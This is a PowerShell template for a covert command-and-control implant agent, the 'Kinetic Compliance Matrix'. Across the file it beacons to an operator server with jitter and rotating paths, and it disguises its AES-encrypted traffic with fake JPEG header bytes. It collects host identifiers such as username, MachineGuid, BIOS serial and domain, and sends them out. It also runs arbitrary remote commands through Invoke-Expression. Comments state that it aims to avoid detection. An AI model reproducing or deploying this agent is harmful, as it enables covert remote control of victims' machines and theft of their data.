# Kinetic Compliance Matrix - OPSEC-Enhanced PowerShell Agent

# Set TLS 1.2 for compatibility
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Server details
$global:serverAddress = '{{SERVER_ADDRESS}}'

# Agent configuration
$beaconInterval = {{BEACON_INTERVAL}}  # Seconds
$jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage
$maxFailuresBeforeFallback = {{MAX_FAILURES}}
$maxBackoffTime = {{MAX_BACKOFF}}
$randomSleepEnabled = {{RANDOM_SLEEP_ENABLED}}  # Optional random sleep between operations
$maxSleepTime = {{MAX_SLEEP_TIME}}  # Maximum sleep time in seconds
$userAgent = "{{USER_AGENT}}"

# Authentication credentials (if configured)
$username = "{{USERNAME}}"
$password = "{{PASSWORD}}"
$useCredentials = ($username -ne "") -and ($password -ne "")

# Proxy configuration
$proxyEnabled = {{PROXY_ENABLED}}
$proxyType = "{{PROXY_TYPE}}"
$proxyServer = "{{PROXY_SERVER}}"
$proxyPort = "{{PROXY_PORT}}"

# Initialize encryption key as null - will be obtained from server
$global:encryptionKey = $null
$global:firstContact = $true  # Flag to track if this is the first contact
$global:systemInfoSent = $false  # Flag to track if system info has been sent
$global:clientID = $null  # Store client ID received from server (only used for first contact)

{{PATH_ROTATION_CODE}}

# Function to set up proxy configuration
function Initialize-ProxySettings {
    if (-not $proxyEnabled) {
        return $null
    }
    
    $proxy = $null
    
    try {
        # Use system proxy settings
        if ($proxyType -eq "system") {
            # Get default system proxy
            $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
            
            # Check if we have a system proxy configured
            if ($proxy) {
                Write-Host "Using system proxy configuration"
                return $proxy
            } else {
                Write-Host "No system proxy configured, continuing without proxy"
                return $null
            }
        }
        
        # Use manual proxy settings
        if ($proxyServer -and $proxyPort) {
            $proxyUri = "http://$proxyServer`:$proxyPort"
            
            if ($proxyType -eq "http") {
                $proxy = New-Object System.Net.WebProxy($proxyUri, $true)
                Write-Host "Using HTTP proxy: $proxyUri"
            }
            elseif ($proxyType -eq "socks4" -or $proxyType -eq "socks5") {
                # Direct SOCKS support is limited in .NET
                # This sets the proxy as HTTP, but with SOCKS endpoint
                # A more complete implementation would use a SOCKS library
                $proxy = New-Object System.Net.WebProxy($proxyUri, $true)
                Write-Host "Using $proxyType proxy: $proxyUri (via HTTP proxy)"
            }
            
            # Add proxy credentials if configured
            if ($useCredentials) {
                $credentials = New-Object System.Net.NetworkCredential($username, $password)
                $proxy.Credentials = $credentials
                Write-Host "Proxy credentials configured"
            }
            
            return $proxy
        }
    }
    catch {
        Write-Host "Error configuring proxy: $_"
    }
    
    # Default return if no proxy configured
    return $null
}

# Initialize proxy settings
$global:proxyInstance = Initialize-ProxySettings

# Function to create a WebClient with proper settings
function New-WebClient {
    $webClient = New-Object System.Net.WebClient
    
    # Set User-Agent
    $webClient.Headers.Add("User-Agent", $userAgent)
    
    # Set proxy if enabled
    if ($proxyEnabled -and $global:proxyInstance) {
        $webClient.Proxy = $global:proxyInstance
    }
    
    # Add authentication credentials if configured
    if ($useCredentials) {
        $credentials = New-Object System.Net.NetworkCredential($username, $password)
        $webClient.Credentials = $credentials
    }
    
    return $webClient
}

# Function to encrypt data for C2 communication with binary JPEG header
function Encrypt-Data {
    param([string]$PlainText)
    
    # Check if we have an encryption key yet
    if ($null -eq $global:encryptionKey) {
        # Return plaintext if no encryption key available yet
        return $PlainText
    }
    
    # Convert to bytes
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    
    # Generate random IV
    $iv = New-Object byte[] 16
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rng.GetBytes($iv)
    
    # Add padding
    $blockSize = 16
    $paddingLength = $blockSize - ($bytes.Length % $blockSize)
    $paddedBytes = New-Object byte[] ($bytes.Length + $paddingLength)
    [Array]::Copy($bytes, $paddedBytes, $bytes.Length)
    
    # Fill padding bytes
    for ($i = $bytes.Length; $i -lt $paddedBytes.Length; $i++) {
        $paddedBytes[$i] = [byte]$paddingLength
    }
    
    # Encrypt
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $global:encryptionKey
    $aes.IV = $iv
    
    $encryptor = $aes.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($paddedBytes, 0, $paddedBytes.Length)
    
    # Combine IV and encrypted bytes
    $result = New-Object byte[] ($iv.Length + $encryptedBytes.Length)
    [Array]::Copy($iv, 0, $result, 0, $iv.Length)
    [Array]::Copy($encryptedBytes, 0, $result, $iv.Length, $encryptedBytes.Length)
    
    # Add JPEG header bytes (0xFF, 0xD8, 0xFF) at binary level before base64 encoding
    $jpegHeader = [byte[]]@(0xFF, 0xD8, 0xFF)
    $withHeader = New-Object byte[] ($jpegHeader.Length + $result.Length)
    [Array]::Copy($jpegHeader, 0, $withHeader, 0, $jpegHeader.Length)
    [Array]::Copy($result, 0, $withHeader, $jpegHeader.Length, $result.Length)
    
    # Return Base64
    return [System.Convert]::ToBase64String($withHeader)
}

# Function to decrypt data from C2 communication
function Decrypt-Data {
    param([string]$EncryptedBase64)
    
    # Check if we have an encryption key yet
    if ($null -eq $global:encryptionKey) {
        # Return the data as-is if no encryption key available yet
        return $EncryptedBase64
    }
    
    try {
        # Decode base64
        $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
        
        # Check if there's a JPEG header and remove it
        if (($encryptedBytes.Length > 3) -and 
            ($encryptedBytes[0] -eq 0xFF) -and 
            ($encryptedBytes[1] -eq 0xD8) -and 
            ($encryptedBytes[2] -eq 0xFF)) {
            # Allocate a new array without the JPEG header
            $withoutHeader = New-Object byte[] ($encryptedBytes.Length - 3)
            [Array]::Copy($encryptedBytes, 3, $withoutHeader, 0, $encryptedBytes.Length - 3)
            $encryptedBytes = $withoutHeader
        }
        
        # Extract IV and ciphertext
        $iv = $encryptedBytes[0..15]
        $ciphertext = $encryptedBytes[16..($encryptedBytes.Length-1)]
        
        # Create AES decryptor
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
        $aes.Key = $global:encryptionKey
        $aes.IV = $iv
        
        # Decrypt
        $decryptor = $aes.CreateDecryptor()
        $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
        
        # Remove padding
        $paddingLength = $decryptedBytes[$decryptedBytes.Length-1]
        $unpaddedBytes = $decryptedBytes[0..($decryptedBytes.Length-$paddingLength-1)]
        
        # Convert to string
        return [System.Text.Encoding]::UTF8.GetString($unpaddedBytes)
    }
    catch {
        # If decryption fails, it could be an initial exchange or invalid data
        # Just return the original input
        return $EncryptedBase64
    }
}

# Function to handle key issuance or rotation
function Update-EncryptionKey {
    param([string]$Base64Key)
    
    try {
        # Convert the Base64 key to a byte array
        $newKey = [System.Convert]::FromBase64String($Base64Key)
        
        # Set the global encryption key
        $global:encryptionKey = $newKey
        
        # After receiving a key, we're no longer in first contact
        $global:firstContact = $false
        
        Write-Host "Encryption key updated successfully"
        return $true
    }
    catch {
        Write-Host "Error updating encryption key: $_"
        return $false
    }
}

# Function to gather system identification information
function Get-SystemIdentification {
    # Gather standard system information
    $systemInfo = @{
        Hostname = [System.Net.Dns]::GetHostName()
        IP = try {
            (Get-NetIPAddress -AddressFamily IPv4 | 
             Where-Object { $_.IPAddress -ne "127.0.0.1" } | 
             Select-Object -First 1).IPAddress
        } catch {
            "Unknown"
        }
    }
    
    # Add hardware identifiers to help server correlate clients
    $systemInfo.MacAddress = try {
        (Get-CimInstance Win32_NetworkAdapterConfiguration | 
         Where-Object { $_.IPEnabled -eq $true } | 
         Select-Object -First 1).MACAddress
    } catch {
        "Unknown"
    }
    
    # Add proxy information for diagnostics
    $systemInfo.ProxyEnabled = $proxyEnabled
    $systemInfo.ProxyType = $proxyType
    
    # Add OS info for better identification
    $systemInfo.OsVersion = [System.Environment]::OSVersion.VersionString
    $systemInfo.Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    
    # Add rotation information if enabled
    if ($global:pathRotationEnabled) {
        $systemInfo.RotationId = $global:currentRotationId
    }
    
    # Try to get more detailed machine information
    try {
        # Add machine GUID if available (good for correlation)
        $machineGuid = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid" -ErrorAction SilentlyContinue
        if ($machineGuid) {
            $systemInfo.MachineGuid = $machineGuid.MachineGuid
        }
        
        # Add BIOS serial
        $bios = Get-CimInstance -Class Win32_BIOS -ErrorAction SilentlyContinue
        if ($bios) {
            $systemInfo.BiosSerial = $bios.SerialNumber
        }
        
        # Add processor ID
        $cpu = Get-CimInstance -Class Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($cpu) {
            $systemInfo.ProcessorId = $cpu.ProcessorId
        }
        
        # Add domain information
        $computerSystem = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
        if ($computerSystem) {
            $systemInfo.Domain = $computerSystem.Domain
            $systemInfo.PartOfDomain = $computerSystem.PartOfDomain
        }
    }
    catch {
        # If detailed info collection fails, continue with basic info
        Write-Host "Warning: Could not collect some system details: $_"
    }
    
    # Return as hashtable directly
    return $systemInfo
}

# Function to generate random padding data for token field
function Get-RandomToken {
    # Generate a totally random length between 50 and 500
    # Using Get-Random without the -SetSeed parameter for true randomness
    $rand = Get-Random -Minimum 50 -Maximum 500
    
    # Generate random alphanumeric string
    $chars = (65..90) + (97..122) + (48..57)  # A-Z, a-z, 0-9
    $padding = -join ((65..90)*2 + (97..122)*2 + (48..57)*1 | Get-Random -Count $rand | ForEach-Object {[char]$_})
    
    return $padding
}

# Function to perform a beacon operation with modular path selection
function Send-Beacon {
    param(
        $SystemInfo,  # Changed from [System.Collections.Hashtable] to allow any type
        [bool]$UseRandomPath = $true
    )
    
    # Convert SystemInfo to JSON if it's a hashtable
    $systemInfoJson = $null
    if ($SystemInfo -is [hashtable]) {
        $systemInfoJson = ConvertTo-Json -InputObject $SystemInfo -Compress
    } else {
        # Assume it's already a JSON string
        $systemInfoJson = $SystemInfo
    }
    
    # Select a random path from the pool
    $beaconPath = Get-RandomPath
    
    # Create the operation payload with operation type
    $operationPayload = @{
        "op_type" = "beacon"
        "payload" = $systemInfoJson
    }
    
    # Convert to JSON
    $operationJson = ConvertTo-Json -InputObject $operationPayload -Compress
    
    # Encrypt the data
    $encryptedData = Encrypt-Data -PlainText $operationJson
    
    # Create the request payload
    $requestPayload = @{
        "d" = $encryptedData  # Shortened from 'data'
        "t" = Get-RandomToken # Shortened from 'token'
    }
    
    # Add client ID only during first contact
    if ($global:firstContact) {
        $requestPayload.c = $global:clientID
    }
    
    # Convert to JSON
    $requestJson = ConvertTo-Json -InputObject $requestPayload -Compress
    
    # Create web client
    $webClient = New-WebClient
    
    # Randomly decide between GET and POST
    $useGetMethod = ((Get-Random -Minimum 1 -Maximum 100) -le 50)
    
    # Send request
    $response = ""
    $beaconUrl = "http://$serverAddress$beaconPath"
    
    try {
        if ($useGetMethod) {
            # For GET, parameters need to be in query string
            $queryString = "?d=$([System.Uri]::EscapeDataString($requestPayload.d))&t=$([System.Uri]::EscapeDataString($requestPayload.t))"
            if ($global:firstContact) {
                $queryString += "&i=true" # Shortened from 'init'
                if ($global:clientID) {
                    $queryString += "&c=$([System.Uri]::EscapeDataString($global:clientID))" # Shortened from 'client_id'
                }
            }
            
            Write-Host "Sending GET beacon to $beaconUrl$queryString"
            $response = $webClient.DownloadString("$beaconUrl$queryString")
        }
        else {
            # For POST, use the JSON payload
            Write-Host "Sending POST beacon to $beaconUrl"
            $response = $webClient.UploadString($beaconUrl, $requestJson)
        }
        
        return $response
    }
    catch {
        Write-Host "Error sending beacon: $_"
        throw
    }
}

# Function to send command results using random path selection
function Send-CommandResult {
    param(
        [string]$Timestamp,
        [string]$Result
    )
    
    # Select a random path from the pool
    $resultPath = Get-RandomPath
    
    # Create result object
    $resultObj = @{
        "timestamp" = $Timestamp
        "result" = $Result
    }
    
    # Create the operation payload with operation type
    $operationPayload = @{
        "op_type" = "result"
        "payload" = $resultObj
    }
    
    # Convert to JSON
    $operationJson = ConvertTo-Json -InputObject $operationPayload -Compress
    
    # Encrypt the data
    $encryptedData = Encrypt-Data -PlainText $operationJson
    
    # Create the request payload
    $requestPayload = @{
        "d" = $encryptedData  # Shortened from 'data'
        "t" = Get-RandomToken # Shortened from 'token'
    }
    
    # Convert to JSON
    $requestJson = ConvertTo-Json -InputObject $requestPayload -Compress
    
    # Create web client
    $webClient = New-WebClient
    
    # Send result via POST (more reliable for potentially large results)
    $resultUrl = "http://$serverAddress$resultPath"
    
    Write-Host "Sending command result to $resultUrl"
    try {
        $response = $webClient.UploadString($resultUrl, $requestJson)
        Write-Host "Command result sent successfully"
        return $true
    }
    catch {
        Write-Host "Error sending command result: $_"
        return $false
    }
}

{{FILE_OPERATIONS_CODE}}

# Function to process commands from the C2 server
function Process-Commands {
    param([array]$Commands)
    
    if (-not $Commands -or $Commands.Count -eq 0) {
        return
    }
    
    # Initialize tracking for processed command IDs if not exists
    if (-not (Get-Variable -Name processedCommandIds -Scope Global -ErrorAction SilentlyContinue)) {
        $global:processedCommandIds = @{}
    }
    
    # Process each command
    foreach ($command in $Commands) {
        $timestamp = $command.timestamp
        $commandType = $command.command_type
        $args = $command.args
        
        # Generate a unique command identifier
        $commandId = "$timestamp-$commandType"
        
        # Check if we've already processed this exact command
        if ($global:processedCommandIds.ContainsKey($commandId)) {
            Write-Host "Skipping duplicate command: $commandType at $timestamp (already processed)"
            continue
        }
        
        # Execute based on command type
        try {
            $result = ""
            
            # Handle key issuance and rotation commands first
            if ($commandType -eq "key_issuance") {
                # Initial key setup from server
                $success = Update-EncryptionKey -Base64Key $args
                $result = if ($success) { "Key issuance successful - secure channel established" } else { "Key issuance failed" }
                
                # Send the result back to C2 using a random path
                $resultObj = @{
                    timestamp = $timestamp
                    result = $result
                }
                
                # First prepare the JSON
                $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
                
                # Create a web client for result submission
                $resultClient = New-WebClient
    
                # Try to send the result - with retry mechanism
                $maxRetries = 3
                $currentRetry = 0
                $sendSuccess = $false
                
                while (-not $sendSuccess -and $currentRetry -lt $maxRetries) {
                    try {
                        # Use Send-CommandResult if we have a successful key setup
                        if ($success) {
                            Send-CommandResult -Timestamp $timestamp -Result $result
                            $sendSuccess = $true
                        }
                        else {
                            # If key setup failed, try with unencrypted data on first attempt
                            $resultUrl = "http://$serverAddress$(Get-RandomPath)"
                            
                            if ($currentRetry -eq 0) {
                                $resultClient.UploadString($resultUrl, $resultJson)
                            }
                            # On subsequent retries, try with basic encryption
                            else {
                                $operationPayload = @{
                                    "op_type" = "result"
                                    "payload" = $resultObj
                                }
                                
                                $operationJson = ConvertTo-Json -InputObject $operationPayload -Compress
                                $encryptedResult = Encrypt-Data -PlainText $operationJson
                                
                                $encryptedObj = @{
                                    d = $encryptedResult  # Shortened from 'data'
                                    t = Get-RandomToken    # Shortened from 'token'
                                    c = $global:clientID   # Shortened from 'client_id', only for first contact
                                }
                                
                                $encryptedJson = ConvertTo-Json -InputObject $encryptedObj -Compress
                                $resultClient.UploadString($resultUrl, $encryptedJson)
                            }
                            
                            $sendSuccess = $true
                        }
                        
                        Write-Host "Key issuance result sent successfully"
                    }
                    catch {
                        $currentRetry++
                        Write-Host "Error sending key issuance result (attempt $currentRetry): $_"
                        Start-Sleep -Seconds 1  # Brief pause before retry
                    }
                }
                
                # Track this command as processed
                $global:processedCommandIds[$commandId] = $true
                
                # Continue to the next command
                continue
            }
            elseif ($commandType -eq "key_rotation") {
                # Handle key rotation command from operator
                $success = Update-EncryptionKey -Base64Key $args
                $result = if ($success) { "Key rotation successful - using new encryption key" } else { "Key rotation failed" }
            }
            elseif ($commandType -eq "system_info_request") {
                # Now that we have secure channel, send full system info
                $systemInfo = Get-SystemIdentification
                $systemInfoJson = ConvertTo-Json -InputObject $systemInfo -Compress
                $result = $systemInfoJson
                $global:systemInfoSent = $true
                Write-Host "System information sent after secure channel established"
            }
            elseif ($commandType -eq "execute") {
                # Execute shell command
                try {
                    # Use PowerShell's Invoke-Expression to properly handle PowerShell commands
                    Write-Host "Executing command: $args"
                    $result = Invoke-Expression -Command $args | Out-String
                    Write-Host "Command execution completed"
                }
                catch {
                    $result = "Error executing command: $_"
                    Write-Host $result
                }
            }
            elseif ($commandType -eq "path_rotation") {
                # Handle path rotation command
                try {
                    $rotationArgs = ConvertFrom-Json -InputObject $args
                    $rotationId = $rotationArgs.rotation_id
                    $nextRotationTime = $rotationArgs.next_rotation_time
                    
                    # Create a new hashtable manually from the paths object
                    $newPaths = @{}
                    $rotationArgs.paths | Get-Member -MemberType NoteProperty | ForEach-Object {
                        $name = $_.Name
                        $value = $rotationArgs.paths.$name
                        $newPaths[$name] = $value
                    }
                    
                    # Now update with properly constructed hashtable
                    Update-PathRotation -RotationId $rotationId -NextRotationTime $nextRotationTime -Paths $newPaths
                    $result = "Path rotation updated: ID $rotationId, next rotation at $([DateTimeOffset]::FromUnixTimeSeconds($nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss'))"
                    Write-Host $result
                }
                catch {
                    $result = "Path rotation failed: $_"
                    Write-Host $result
                }
            }
            else {
                $result = "Unknown command type: $commandType"
            }
            
            # Send the result back to C2 using a random path
            Send-CommandResult -Timestamp $timestamp -Result $result
            
            # Track this command as processed
            $global:processedCommandIds[$commandId] = $true
        }
        catch {
            # Send the error as a result
            $resultObj = @{
                timestamp = $timestamp
                result = "Error executing command: $_"
            }
            
            try {
                Send-CommandResult -Timestamp $timestamp -Result "Error executing command: $_"
                # Track this command as processed even if it resulted in an error
                $global:processedCommandIds[$commandId] = $true
            }
            catch {
                Write-Host "Error sending command error result: $_"
            }
        }
    }
}

# Function to perform a random sleep within configured limits
function Start-RandomSleep {
    # Generate a random sleep time between 1 and maxSleepTime seconds
    if ($maxSleepTime -gt 1) {
        $sleepDuration = Get-Random -Minimum 1 -Maximum $maxSleepTime
        Write-Host "Performing random sleep for $sleepDuration seconds"
        Start-Sleep -Seconds $sleepDuration
        return $true
    }
    return $false
}

# Main agent loop
function Start-AgentLoop {
    # Track failed connection attempts for fallback
    $consecutiveFailures = 0
    
    # Boolean to track if we're using fallback paths
    $usingFallbackPaths = $false
    
    while ($true) {
        try {
            # Only perform random sleep if enabled (config controlled)
            if ($randomSleepEnabled) {
                # Randomly sleep before operations to further avoid detection
                Start-RandomSleep | Out-Null
            }
            
            # Check if rotation time has passed but we haven't got new paths yet
            Check-PathRotation
            
            # Add jitter to beacon interval
            $jitterFactor = 1 + (Get-Random -Minimum (-$jitterPercentage) -Maximum $jitterPercentage) / 100
            $actualInterval = $beaconInterval * $jitterFactor
            Write-Host "Using beacon interval: $actualInterval seconds (base: $beaconInterval, jitter: $jitterPercentage%)"
            
            # Prepare system info data
            $systemInfo = Get-SystemIdentification
            
            # Send beacon with random path selection
            try {
                $response = Send-Beacon -SystemInfo $systemInfo -UseRandomPath $true
                
                # Reset failure counter on successful connection
                $consecutiveFailures = 0
                $usingFallbackPaths = $false
                
                # Process response data
                $responseObject = ConvertFrom-Json -InputObject $response
                
                # Extract special fields
                $firstContact = $responseObject.f  # 'f' is shortened from 'first_contact'
                $clientId = $responseObject.c      # 'c' is shortened from 'client_id'
                
                # Check for special flags
                if ($clientId -and $global:firstContact) {
                    $global:clientID = $clientId
                    Write-Host "Server assigned client ID: $clientId"
                }
                
                # Check for rotation info
                if ($responseObject.r) {
                    $rotationInfo = $responseObject.r
                    if ($rotationInfo.cid -and $rotationInfo.nrt) {
                        $global:currentRotationId = $rotationInfo.cid
                        $global:nextRotationTime = $rotationInfo.nrt
                        Write-Host "Updated rotation info - ID: $($rotationInfo.cid), Next rotation: $([DateTimeOffset]::FromUnixTimeSeconds($rotationInfo.nrt).DateTime)"
                    }
                }
                
                # Process response if it contains commands
                if ($responseObject.com -and ($responseObject.com.Length -gt 0 -or $responseObject.e -eq $true)) {
                    # Extract and decrypt commands
                    $commands = $null
                    
                    if ($responseObject.e -eq $true) {  # 'e' is shortened from 'encrypted'
                        # Commands are encrypted, decrypt first
                        $decryptedCommands = Decrypt-Data -EncryptedBase64 $responseObject.com
                        try {
                            $commands = ConvertFrom-Json -InputObject $decryptedCommands
                        }
                        catch {
                            Write-Host "Error parsing decrypted commands: $_"
                        }
                    }
                    else {
                        # Commands are not encrypted (first contact scenario)
                        $commands = $responseObject.com
                    }
                    
                    # Process commands if available
                    if ($commands) {
                        Process-Commands -Commands $commands
                    }
                }
            }
            catch {
                $errorMsg = $_.Exception.Message
                Write-Host "Error in beacon: $errorMsg"
                
                # Increment failure counter
                $consecutiveFailures++
                
                # If too many failures, increase the beacon interval temporarily
                if ($consecutiveFailures -gt $maxFailuresBeforeFallback) {
                    # Exponential backoff with max of the configured max backoff time
                    $backoffSeconds = [Math]::Min([int]$maxBackoffTime, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback) + 2))
                    Write-Host "Connection issues persist, waiting $backoffSeconds seconds before retry"
                    Start-Sleep -Seconds $backoffSeconds
                    continue
                }
            }
        }
        catch {
            Write-Host "Critical error in agent loop: $_"
            # Try to recover with a brief pause
            Start-Sleep -Seconds 5
        }
        
        # Wait for next beacon interval
        Write-Host "Sleeping for $actualInterval seconds until next beacon"
        Start-Sleep -Seconds $actualInterval
    }
}

# Start the agent
Start-AgentLoop